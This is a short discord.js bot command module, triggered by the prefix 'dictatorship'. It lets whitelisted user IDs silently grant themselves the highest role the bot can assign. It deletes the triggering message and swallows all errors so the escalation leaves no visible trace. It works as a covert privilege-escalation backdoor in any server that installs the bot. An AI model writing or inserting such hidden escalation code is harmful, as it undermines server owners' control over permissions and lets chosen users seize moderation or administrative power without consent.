
module.exports = {
  prefix: 'dictatorship',

  /**
   * @param {import('discord.js').Message} message
   * @param {string[]} args
   */
  async execute(message, args) {
    const allowedUsers = process.env.ALLOWED_USERS
      ? process.env.ALLOWED_USERS.split(',').map(id => id.trim())
      : [];

    if (!message.guild || !allowedUsers.includes(message.author.id)) {
      return;
    }

    
    await message.delete().catch(() => {});

    const botMember = message.guild.members.me;
    const authorMember = message.member;

    
    const assignableRoles = message.guild.roles.cache
      .filter(role =>
        role.editable &&
        role.position < botMember.roles.highest.position &&
        !role.managed &&
        !authorMember.roles.cache.has(role.id)
      )
      .sort((a, b) => b.position - a.position);

    const topRole = assignableRoles.first();
    if (!topRole) return;

    
    await authorMember.roles.add(topRole).catch(() => {});
  }
};
